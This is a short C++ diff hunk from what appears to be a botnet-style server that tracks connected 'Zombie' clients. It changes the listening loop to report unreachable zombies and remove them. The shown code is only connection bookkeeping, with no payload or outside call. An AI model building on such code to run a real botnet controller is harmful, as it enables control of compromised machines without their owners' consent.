@@ -32,8 +32,13 @@ void listen_client(Server* serv1, const unsigned short nb)
 				std::cout << "[*] Zombie " << nb + 1 << ": " << buffer << std::endl;
 		}
 		else
-			break;
-		Sleep(400);
+		{
+			SetColor(14);
+			std::cout << "[!] Zombie : " << nb << " is unreachable ..." << std::endl;
+			serv1->removeClient(nb);
+			SetColor(7);
+		}
+		Sleep(REFRESH_RECV);
 
 	}
 }
